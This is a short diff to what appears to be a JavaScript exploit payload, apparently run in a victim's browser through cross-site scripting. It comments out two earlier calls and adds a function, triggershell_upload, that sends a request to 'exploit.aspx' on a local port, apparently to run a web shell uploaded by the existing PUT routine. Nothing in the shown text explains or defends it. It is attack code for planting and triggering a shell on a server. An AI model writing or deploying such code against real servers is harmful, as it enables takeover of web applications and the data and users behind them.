@@ -59,6 +59,16 @@ xhr.open("PUT",url,true);
 xhr.send(data);
 }
 
-adminqueuespage();
-move();
+function triggershell_upload(){
+alert('aaa');
+var url="http://127.0.0.1:4512/exploit.aspx"
+var xhr=new XMLHttpRequest();
+xhr.open("GET",url,true);
+xhr.send(null);
+}
+
+
+//adminqueuespage();
+//move();
 uploadss()
+triggershell_upload()
